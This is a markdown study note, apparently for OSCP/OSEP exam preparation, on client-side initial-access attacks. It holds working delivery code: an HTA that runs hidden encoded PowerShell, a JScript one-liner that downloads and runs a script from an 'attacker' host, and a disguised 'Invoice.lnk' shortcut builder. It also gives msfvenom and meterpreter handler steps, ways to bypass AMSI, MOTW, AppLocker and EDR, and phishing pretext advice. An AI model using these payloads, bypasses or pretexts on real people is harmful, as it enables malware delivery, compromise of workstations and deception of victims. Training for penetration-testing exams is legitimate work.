---
title: Client-side attacks primer
slug: client-side-attacks-primer
aliases: [client-side-primer, client-side-attacks]
---

{% raw %}

> **TL;DR:** Client-side attacks target the user, not the server. You deliver code (HTA, macro, JScript, browser exploit, malicious LNK) that runs in the user's session and either pops a shell or steals creds. On OSCP this is one chapter; on OSEP it's the whole opening act. This is the floor — deeper notes follow in [[office-vba-macros-initial-access]], [[jscript-hta-wsh-initial-access]] and the red-team tree.

## Why this matters
Network-side attacks pop services. Client-side attacks pop *people*. In assumed-breach engagements (OSEP) and increasingly in OSCP labs that have a "click this link" hint, you'll deliver a payload to a workstation and catch a shell when the user double-clicks.

## The five delivery surfaces

### 1. Office macros (VBA)
Word/Excel/PowerPoint documents containing VBA macros. Still the highest-success channel against humans.

- File types: `.docm`, `.xlsm`, `.dotm` (preferred — bypasses some MOTW protections).
- Default behaviour: macros disabled; user clicks "Enable Content".
- Detection: AMSI scans macro source on Office 365.
- Detail: [[office-vba-macros-initial-access]]

### 2. HTA (HTML Application)
A `.hta` file is HTML + JScript/VBScript run by `mshta.exe` outside the browser sandbox. Full local execution.

```html
<html><body>
<script language="VBScript">
  CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc ...", 0, False
  window.close()
</script>
</body></html>
```

Run with `mshta http://attacker/x.hta` or local double-click. Detail in [[jscript-hta-wsh-initial-access]].

### 3. JScript / WSH (.js, .wsf, .vbs)
Plain `.js` files run by `wscript.exe`. Often delivered inside a zip (bypasses some mail-gateway filtering of executables).

```javascript
var sh = new ActiveXObject("WScript.Shell");
sh.Run("powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')", 0, false);
```

### 4. LNK shortcuts
A `.lnk` file can point `target` at `cmd.exe /c <command>` and set `iconlocation` to a legitimate-looking icon. Double-click fires.

```powershell
$w = New-Object -ComObject WScript.Shell
$s = $w.CreateShortcut("$env:TEMP\Invoice.lnk")
$s.TargetPath  = "cmd.exe"
$s.Arguments   = "/c powershell -nop -w hidden -e <b64>"
$s.IconLocation = "shell32.dll, 70"
$s.Save()
```

### 5. Browser exploits / drive-by
A malicious page that triggers a browser RCE. On modern browsers this is nation-state-tier. In OSCP labs you may see deliberately old IE installs (see Internet Explorer 11 lab boxes). Don't expect this on modern engagements.

## The browser angle for OSCP labs
Some OSCP lab boxes ship with patched-out browsers (no DEP, old EMET). Deliver via:
- `msfvenom -p windows/meterpreter/reverse_https -f hta-psh -o pwn.hta`
- Host on attacker's `python3 -m http.server`
- Trick the user (often a service account simulation) to fetch.

## Defences you'll bypass

| Defence | What it does | Bypass approach |
|---|---|---|
| Macro blocking | Default-off macros | Social engineer click; ship `.dotm` template |
| Mark of the Web (MOTW) | Tags downloaded files | Container files (ISO, IMG, VHD) that don't propagate MOTW (vendor has patched many) |
| AMSI | Scans script content | String mangling, AMSI patch in memory — see [[amsi-bypass]] |
| AppLocker / WDAC | Allowlists binaries | LOLBins (rundll32, mshta, regsvr32, installutil) — see [[applocker-bypass-techniques]] |
| EDR | Behaviour monitoring | Direct syscalls, indirect syscalls, parent PID spoofing |
| Constrained Language Mode (CLM) | Limits PowerShell | Downgrade to PSv2, AMSI bypass into FullLanguage |

## Pretexting basics
A payload that requires a click only works if the user clicks. For lab targets the email/text is given; for engagements you need a pretext that:
- matches a real-business workflow ("DocuSign — please review"),
- arrives from a plausible sender (typo-domain, spoofed display name),
- creates *just enough* urgency without triggering scepticism.

OPSEC: never reuse a pretext domain across targets, never click your own bait from monitored hosts, log every delivery.

## OSCP-flavour walkthrough (minimum viable)

1. Generate a meterpreter-stager HTA:
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=tun0 LPORT=443 \
     -f hta-psh -o invoice.hta
   ```
2. Host:
   ```bash
   python3 -m http.server 80
   ```
3. Start handler:
   ```text
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_https
   set LHOST tun0
   set LPORT 443
   exploit -j
   ```
4. Trigger from the victim:
   ```text
   mshta http://10.10.14.5/invoice.hta
   ```

You should catch a meterpreter session in the user's context.

## OSEP-flavour evolution
Same payload chain, but:
- AMSI-patched stager (string-encoded; see [[amsi-bypass]]).
- Process injection out of mshta into a trusted process (notepad, explorer) — see [[process-injection-techniques]].
- Egress over HTTPS to a Cloudfront/Cloudflare front — see [[domain-fronting-and-cdn-abuse]].
- Persistence via registry run key, WMI event sub, or scheduled task — see [[persistence-techniques-windows]].

## References
- [Red Team Notes — initial access](https://www.ired.team/offensive-security/initial-access)
- [Outflank — Office, HTA, MOTW research](https://outflank.nl/blog/)
- [LOLBAS project](https://lolbas-project.github.io/)
- See also: [[office-vba-macros-initial-access]], [[jscript-hta-wsh-initial-access]], [[applocker-bypass-techniques]], [[amsi-bypass]], [[osep-roadmap]]

{% endraw %}
